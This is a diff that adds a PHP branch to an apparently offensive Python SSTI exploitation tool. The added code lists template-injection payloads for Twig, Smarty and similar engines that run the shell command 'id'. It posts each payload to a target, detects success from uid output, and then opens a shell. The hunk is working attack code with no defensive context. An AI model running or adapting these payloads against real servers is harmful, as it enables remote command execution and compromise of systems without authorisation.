@@ -72,6 +72,21 @@ def exploit(url, key, language):
             print("\n------------------\nPHP identified\n------------------")
             print("Trying to open a shell using Twig patterns")
             print("------------------------------------------------------")
+            payloads = ['{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}', '{php}echo system("id");{/php}', "{$smarty.const.PHP_OS|system('id')}", "{{ `id` }}",
+                        "{{#callable}}{{system('id')}}{{/callable}}", "{% set cmd = 'id' %}{{ cmd|exec }}", "{{ 'id'|filter('system') }}", "{{ _self.env.registerUndefinedFilterCallback('shell_exec') }}{{ _self.env.getFilter('id') }}",
+                        "{% set payload = 'system('id')' %}{{ payload|eval }}", "{{ ['id']|map('system')|join }}", "{{ app.request.server.get('DOCUMENT_ROOT')|system('id') }}"]
+            for payload in payloads:
+                try:
+                    r = requests.post(url, data={f"{key}": payload})
+                    if re.search(r"uid=\d+\(.+?\)", r.text):
+                        print(f"Shell obtained with payload '{payload}'\n")
+                        openshell(url, key, payload)
+                        return True
+                except:
+                    continue
+            print("No shell obtained but SSTI is confirmed")
+        
+        
         case "java":
             print("\n------------------\nJava identified\n------------------")
             print("Trying to open a shell using Freemarker/Velocity patterns")
